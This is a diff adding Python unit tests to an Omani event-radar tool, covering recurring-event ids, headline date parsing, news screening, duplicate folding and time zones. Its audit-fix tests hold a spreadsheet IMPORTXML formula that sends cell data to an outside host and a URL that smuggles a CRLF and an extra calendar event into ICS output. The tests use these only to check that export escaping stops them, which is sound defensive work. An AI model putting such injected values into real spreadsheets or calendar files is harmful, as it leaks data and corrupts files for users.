@@ -113,6 +113,17 @@ class Verification(unittest.TestCase):
         self.assertEqual(moved.previous_start, "2026-09-06")
         self.assertNotEqual(model.assign_id(ev("COMEX", D(2027, 9, 5)), known), rid)
 
+    def test_monthly_series_keeps_each_editions_id(self):
+        # Sep dropped out of the source (past); Oct and Nov must keep their own ids, not shift onto Sep's / Oct's
+        key = model.series_key("Startup Majlis")
+        known = {"S": {"series": key, "start": "2026-09-10", "kind": "event"},
+                 "O": {"series": key, "start": "2026-10-10", "kind": "event"},
+                 "N": {"series": key, "start": "2026-11-10", "kind": "event"}}
+        october, november = ev("Startup Majlis", D(2026, 10, 10)), ev("Startup Majlis", D(2026, 11, 10))
+        self.assertEqual(model.assign_id(october, known), "O")
+        self.assertEqual(model.assign_id(november, known), "N")
+        self.assertEqual((october.previous_start, november.previous_start), ("", ""))
+
     def test_expected_next_edition(self):
         hist = [{"series": "comex", "title": "COMEX 2026", "start": "2026-09-06", "end": "2026-09-09",
                  "relevance": "High"}]
@@ -282,4 +293,117 @@ class NewsDates(unittest.TestCase):
 
     def test_excluded_headlines(self):
         cfg = json.load(open(os.path.join(os.path.dirname(__file__), "..", "sources.json"), encoding="utf-8"))["news"]
-        self.assertTrue(self.news._matches("SalamAir launches flights to Erbil", cfg["exclude_title_en"], cfg["exclude_title_ar"]))
+        self.assertEqual(self.news.screen("SalamAir launches flights to Erbil", "a new air show route", "en", cfg), "off-topic")
+
+    def test_tomorrow_headline_beats_a_loose_body_date(self):
+        # "غدا.." (tomorrow) on 25 Oct → 26 Oct, even though the body mentions 28 October
+        self.assertEqual(self.pick("وتختتم الندوة 28 أكتوبر", D(2026, 10, 25), "ar",
+                                   title='غدا.. "الوثائق والمحفوظات الوطنية" تقيم ندوة جنوب الباطنة'), (D(2026, 10, 26), None))
+        # a body range that starts on the headline's day keeps its end
+        self.assertEqual(self.pick("The forum runs October 26-28", D(2026, 10, 25), title="Forum opens tomorrow"),
+                         (D(2026, 10, 26), D(2026, 10, 28)))
+
+    def test_undated_past_date_is_not_moved_a_year_ahead(self):
+        # a late-October review of an exhibition that opened on 3 October is not a 2027 event
+        self.assertEqual(self.pick("Flora & Fauna opened on October 3 at the gallery", D(2026, 10, 25)), (None, None))
+        self.assertEqual(self.pick("Muscat Book Fair returns on 20 February", D(2026, 10, 25)), (D(2027, 2, 20), None))
+
+    def test_quoted_arabic_event_name(self):
+        self.assertEqual(self.news.event_name('27 ورقة عمل في ندوة "جنوب الباطنة في ذاكرة التاريخ العُماني".. الاثنين', "", "ar"),
+                         "ندوة جنوب الباطنة في ذاكرة التاريخ العُماني")
+
+
+class NewsScreening(unittest.TestCase):
+    """Real headlines from the 25–26 Oct 2026 feeds: what is Omani event news and what is not."""
+    from radar import news  # noqa: E402
+    CFG = json.load(open(os.path.join(os.path.dirname(__file__), "..", "sources.json"), encoding="utf-8"))["news"]
+
+    def why(self, title, summary, lang):
+        return self.news.screen(title, summary, lang, self.CFG)
+
+    def test_not_event_news(self):
+        cases = [
+            ("Dollar eases on lower oil prices", "Major currencies traded in tight ranges on Monday at the start of a busy week of central bank decisions", "en"),
+            ("الذهب قرب أدنى مستوى في 3 أشهر ترقبًا لقرار الفيدرالي", "واشنطن- رويترز حومت أسعار الذهب قرب أدنى مستوى لها هذا الأسبوع", "ar"),
+            ("PDO awards SLB five-year well stimulation contract", "MUSCAT, OCT 25 Petroleum Development Oman (PDO) has awarded SLB a five-year contract", "en"),
+            ("ريال مدريد يعلن غياب كورتوا عن الكلاسيكو", "مدريد - رويترز أعلن ريال مدريد أن حارس مرماه سيغيب عن مباراة القمة", "ar"),
+            ("منافسة محتدمة على جائزة الكرة الذهبية", "لندن «أ.ف.ب»: يُقام حفل توزيع جائزة الكرة الذهبية", "ar"),
+            ("Art", "Salvadoran artist Luis Serrano paints a mural during a street art festival in San Marcos, El Salvador. — AFP", "en"),
+            ("\"لولو\" تُطلق الموسم الثاني من \"عالم المأكولات\"", "مسقط- الرؤية أطلقت سلسلة متاجر لولو هايبر ماركت الموسم الثاني في معرض", "ar"),
+            ("منح وزارة الصحة شهادة إشادة شرفية ضمن جوائز الاتحاد الدولي للمستشفيات", "مسقط- الرؤية نالت سلطنة عُمان جائزة التميز خلال الكونغرس العالمي", "ar"),
+            ("بريطانيا تواجه عاصفة قوية وتحذيرات من اضطراب النقل", "لندن – الوكالات تستعد مناطق في المملكة المتحدة خلال عطلة نهاية الأسبوع", "ar"),
+            ("فرنسا تستعد لموجة احتجاجات جديدة وتنشر 70 ألف شرطي", "باريس- الوكالات تترقب فرنسا موجة جديدة خلال عطلة نهاية الأسبوع", "ar"),
+            ("Bayeux Tapestry will not be hung again", "The tapestry returns to France from an exhibition in Britain", "en"),
+            ("Unseen Van Gogh painting exhibited in Hong Kong", "Hundreds queued outside a Hong Kong gallery to see the exhibition", "en"),
+            ("Conference urges AI-backed preservation of Omani heritage", "KUALA LUMPUR: The 10th International Scientific Conference recommended", "en"),
+            ("Oman wraps up child wellbeing summit in Uzbekistan", "SAMARKAND: The Sultanate of Oman concluded its participation in the Global Summit", "en"),
+            ("شراكات تجارية تتوّج ختام مشاركة عُمان في معرض \"سيال\" باريس", "مسقط- الرؤية اختتمت سلطنة عُمان مشاركتها في معرض سيال", "ar"),
+        ]
+        for title, summary, lang in cases:
+            with self.subTest(title=title):
+                self.assertNotEqual(self.why(title, summary, lang), "")
+
+    def test_event_news_kept(self):
+        cases = [
+            ("المؤتمر العلمي لكلية الحقوق يناقش التغيرات المناخية والتحول في الطاقة.. الأربعاء", "مسقط- الرؤية تنظم كلية الحقوق بجامعة السلطان قابوس المؤتمر العلمي العاشر", "ar"),
+            ("Geriatrics conference calls for Alzheimer’s care", "MUSCAT: The fourth conference on Geriatrics and Gerontology has called for", "en"),
+            ("Chinese Film Week kicks off in Oman", "The Chinese Film Week in Oman will be held from October 21 to 24 at VOX Cinemas", "en"),
+            ("انطلاق أعمال \"الملتقى الأدبي والفني\" في صحار", "مسقط- الرؤية تنطلق فعاليات الملتقى الأدبي والفني في نسخته الثامنة والعشرين", "ar"),
+            ("Media Excellence Competition Awards 2026 on Monday", "The Ministry of Information will organize the awards ceremony", "en"),
+            ("ختام فعاليات المعرض الإبداعي النسائي أيقونة بهلا", "اختتمت بقاعة بوابة بهلا فعالية المعرض الإبداعي النسائي", "ar"),
+        ]
+        for title, summary, lang in cases:
+            with self.subTest(title=title):
+                self.assertEqual(self.why(title, summary, lang), "")
+
+    def test_opinion_and_market_sections(self):
+        page = '<nav class="breadcrumb"><a href="/">الرئيسية</a><a href="/c">المقالات</a><a href="/r">رؤى</a></nav>'
+        self.assertIn("المقالات", self.news.sections(page))
+        self.assertIn("business/markets", self.news.sections("", "https://www.omanobserver.om/article/1198576/business/markets/dollar-eases"))
+
+    def test_same_event_folded_into_one(self):
+        a = {"lang": "ar", "published": "2026-10-25", "source": "الرؤية", "url": "u1", "event": None,
+             "title": "انطلاق المهرجان العلمي لتقييم الابتكارات الطلابية ومسابقات الذكاء الاصطناعي بالبريمي",
+             "summary": "انطلقت اليوم بمركز البريمي للعلوم والابتكار فعاليات المهرجان العلمي لتقييم الابتكارات الطلابية"}
+        b = dict(a, source="جريدة عُمان", url="u2", title='منافسات قوية بـ"المهرجان العلمي لتقييم الابتكارات الطلابية" في البريمي',
+                 summary="البريمي- ناصر العبري انطلقت بمركز البريمي للعلوم والابتكار فعاليات المهرجان العلمي لتقييم الابتكارات الطلابية")
+        c = dict(a, url="u3", title="Chinese Film Week kicks off in Oman", lang="en", summary="")
+        kept = self.news.fold_duplicates([a, b, c])
+        self.assertEqual([k["url"] for k in kept], ["u1", "u3"])
+        self.assertEqual(kept[0]["also"], [{"source": "جريدة عُمان", "url": "u2", "title": b["title"]}])
+
+
+class AuditFixes(unittest.TestCase):
+    def test_csv_cells_cannot_become_formulas(self):
+        self.assertEqual(export._cell('=IMPORTXML("https://x/?"&A1,"//a")'), '\'=IMPORTXML("https://x/?"&A1,"//a")')
+        self.assertEqual(export._cell("@SUM(A1)"), "'@SUM(A1)")
+        self.assertEqual(export._cell("Oman Fintech Summit"), "Oman Fintech Summit")
+
+    def test_utc_times_become_muscat_times(self):
+        self.assertEqual(model.parse_time("20261028T140000Z"), "18:00")
+        self.assertEqual(model.parse_time("2026-10-28T06:30:00+00:00"), "10:30")
+        self.assertEqual(model.parse_date("2026-10-28T22:00:00Z"), D(2026, 10, 29))   # already the 29th in Muscat
+        self.assertEqual(model.parse_date("2026-10-28T22:00:00"), D(2026, 10, 28))    # no offset: as written
+
+    def test_ics_timed_event_and_safe_url(self):
+        out = export._ics("t", [("1", D(2026, 11, 2), D(2026, 11, 2), "Forum", "", "https://x.om/a\r\nBEGIN:VEVENT", "",
+                                 False, "11:00", "13:30")], "20260101T000000Z")
+        self.assertIn("DTSTART;TZID=Asia/Muscat:20261102T110000", out)
+        self.assertIn("DTEND;TZID=Asia/Muscat:20261102T133000", out)
+        self.assertIn("TZID:Asia/Muscat", out)
+        self.assertEqual(out.count("\r\nBEGIN:VEVENT"), 1)                             # no injected event line
+        self.assertIn("URL:https://x.om/aBEGIN:VEVENT", out)
+
+    def test_news_range_into_next_year(self):
+        from radar import news
+        self.assertEqual(news.pick_dates("The festival runs 28 December - 3 January", D(2026, 12, 1), D(2026, 12, 1)),
+                         (D(2026, 12, 28), D(2027, 1, 3)))
+
+
+class Times(unittest.TestCase):
+    def test_parse_time(self):
+        self.assertEqual(model.parse_time("2026-11-02 11:00:00"), "11:00")
+        self.assertEqual(model.parse_time("2026-10-28T18:30+04:00"), "18:30")
+        self.assertEqual(model.parse_time("2026-10-28"), "")
+        self.assertEqual(model.parse_time("2026-10-28T00:00:00"), "")
+        self.assertEqual(model.parse_time("20261028T140000"), "14:00")
